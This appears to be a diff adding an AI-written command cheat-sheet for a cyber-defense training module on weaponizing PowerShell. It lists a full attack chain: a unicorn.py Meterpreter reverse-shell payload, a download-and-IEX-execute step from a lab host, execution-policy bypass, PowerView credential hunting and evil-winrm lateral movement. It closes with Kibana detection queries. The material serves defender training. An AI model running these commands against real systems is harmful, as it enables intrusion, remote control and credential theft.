@@ -343,3 +343,255 @@ Disable-NetFirewallRule -DisplayName "Block Outbound Port 1337"
 ---
 
 If you need expanded parameter lists or more details for any specific cmdlet, let me know!
+
+### CDAH-M12L1-Weaponizing PowerShell & Attack Frameworks
+
+Here are all the PowerShell and Linux commands found in m11-m15_dump.md, along with explanations, syntax examples, and any switches/parameters used:
+
+---
+
+## PowerShell Commands
+
+### 1. Invoke-AtomicTest
+
+- **Description:** Runs Atomic Red Team tests for a specific MITRE ATT&CK technique.
+- **Syntax Example:**  
+  Invoke-AtomicTest T1059.001 -ShowDetailsBrief  
+  Invoke-AtomicTest T1059.001 -CheckPrereqs  
+  Invoke-AtomicTest T1059.001
+- **Parameters/Switches:**
+  - T1059.001 — Specifies the technique ID to test.
+  - -ShowDetailsBrief — Shows a brief summary of available tests.
+  - -CheckPrereqs — Checks if the prerequisites for each test are met.
+
+---
+
+### 2. cd (Change Directory)
+
+- **Description:** Changes the current directory.
+- **Syntax Example:**  
+  cd /home/trainee/unicorn
+
+---
+
+### 3. sed
+
+- **Description:** Stream editor for filtering and transforming text (Linux).
+- **Syntax Example:**  
+  sed -z -i 's/\n/\r\n/g;s/powershell/powershell -noprofile/g' powershell_attack.txt
+- **Parameters/Switches:**
+  - -z — Treats input as a set of lines separated by ASCII NUL.
+  - -i — Edits files in-place.
+
+---
+
+### 4. Out-File
+
+- **Description:** Sends output to a file.
+- **Syntax Example:**  
+  $string | Out-File -FilePath $profile -Append
+- **Parameters/Switches:**
+  - -FilePath — Specifies the file to write to.
+  - -Append — Appends to the file instead of overwriting.
+
+---
+
+### 5. echo
+
+- **Description:** Displays a string or variable's value.
+- **Syntax Example:**  
+  echo $profile
+
+---
+
+### 6. Test-Path
+
+- **Description:** Checks if a path exists.
+- **Syntax Example:**  
+  Test-Path $profile
+
+---
+
+### 7. New-Item
+
+- **Description:** Creates a new item (file or folder).
+- **Syntax Example:**  
+  New-Item -Path $profile -Type file -Force
+- **Parameters/Switches:**
+  - -Path — Specifies the path.
+  - -Type — Type of item (file/folder).
+  - -Force — Creates item even if it exists.
+
+---
+
+### 8. Invoke-WebRequest
+
+- **Description:** Downloads content from the web.
+- **Syntax Example:**  
+  (Invoke-WebRequest -URI "http://199.63.64.51:8000/powershell_attack.txt").Content | Out-File -FilePath "C:\Windows\Temp\launch.bat"
+- **Parameters/Switches:**
+  - -URI — The URL to download from.
+
+---
+
+### 9. Start-Process
+
+- **Description:** Starts a new process.
+- **Syntax Example:**  
+  Start-Process -FilePath "powershell" -ArgumentList "-noprofile -command `"IEX(GC C:\Windows\Temp\launch.bat -Raw)`""
+- **Parameters/Switches:**
+  - -FilePath — Executable to run.
+  - -ArgumentList — Arguments to pass.
+
+---
+
+### 10. Get-Content
+
+- **Description:** Reads content from a file.
+- **Syntax Example:**  
+  Get-Content C:\Users\trainee\Documents\backup_pass.txt
+
+---
+
+### 11. Set-ExecutionPolicy
+
+- **Description:** Changes the user preference for the PowerShell script execution policy.
+- **Syntax Example:**  
+  Set-ExecutionPolicy Bypass
+
+---
+
+### 12. . (Dot Sourcing)
+
+- **Description:** Loads a PowerShell script into the current session.
+- **Syntax Example:**  
+  . .\PowerView.ps1
+
+---
+
+### 13. Find-InterestingFile (PowerView function)
+
+- **Description:** Searches for files that may contain credentials.
+- **Syntax Example:**  
+  Find-InterestingFile -Path "C:\Users"
+- **Parameters/Switches:**
+  - -Path — Path to search under.
+
+---
+
+### 14. $credentials = Get-Credential
+
+- **Description:** Prompts for credentials and stores them in a variable.
+- **Syntax Example:**  
+  $credentials = Get-Credential
+
+---
+
+### 15. $session = New-PSSession
+
+- **Description:** Creates a persistent PowerShell session to a remote computer.
+- **Syntax Example:**  
+  $session = New-PSSession -ComputerName eng-wkstn-2 -Credential $credentials
+- **Parameters/Switches:**
+  - -ComputerName — Name of remote computer.
+  - -Credential — Credentials object.
+
+---
+
+### 16. Enter-PSSession
+
+- **Description:** Starts an interactive session with a remote computer.
+- **Syntax Example:**  
+  Enter-PSSession $session
+
+---
+
+## Linux/Metasploit/Evil-WinRM Commands
+
+### 1. ./unicorn.py
+
+- **Description:** Generates shellcode payloads for PowerShell attacks.
+- **Syntax Example:**  
+  ./unicorn.py windows/meterpreter/reverse_https 199.63.64.51 5555
+
+---
+
+### 2. sudo msfconsole -r unicorn.rc
+
+- **Description:** Starts Metasploit Console loading a resource script.
+- **Syntax Example:**  
+  sudo msfconsole -r unicorn.rc
+
+---
+
+### 3. python3 -m http.server
+
+- **Description:** Starts a simple HTTP server in the current directory.
+- **Syntax Example:**  
+  python3 -m http.server
+
+---
+
+### 4. sessions -i 1 (Metasploit)
+
+- **Description:** Interacts with a specific Metasploit session.
+- **Syntax Example:**  
+  sessions -i 1
+
+---
+
+### 5. load stdapi (Meterpreter)
+
+- **Description:** Loads the stdapi extension in Meterpreter for standard commands.
+- **Syntax Example:**  
+  meterpreter > load stdapi
+
+---
+
+### 6. upload (Meterpreter)
+
+- **Description:** Uploads a file to the target machine.
+- **Syntax Example:**  
+  meterpreter > upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 "C:\Windows\Temp\PowerView.ps1"
+
+---
+
+### 7. shell (Meterpreter)
+
+- **Description:** Opens a shell on the victim machine.
+- **Syntax Example:**  
+  meterpreter > shell
+
+---
+
+### 8. evil-winrm
+
+- **Description:** Evil-WinRM is a tool for remote access to Windows using WinRM.
+- **Syntax Example:**  
+  evil-winrm -i 172.16.4.3 -u "john.doe"
+- **Parameters/Switches:**
+  - -i — Target IP address.
+  - -u — Username.
+
+---
+
+## Kibana/ElasticSearch Queries
+
+- **event.code:1 and process.executable :*powershell.exe and process.parent.executable :*powershell.exe**  
+  Finds PowerShell processes started by other PowerShell processes.
+
+- **event.code:4104 and message:"*PowerView*"**  
+  Finds script block execution logs containing PowerView.
+
+- **event.code: 4648 and winlog.event_data.TargetInfo:HTTP***  
+  Finds logons with explicit credentials for HTTP (WinRM).
+
+- **event.code: 91**  
+  Finds WinRM resource allocation events.
+
+- **event.code: 4624 and winlog.event_data.LogonType:3**  
+  Finds successful network logons (potential lateral movement).
+
+---
+
+Let me know if you want detailed examples for any specific command or further breakdowns!
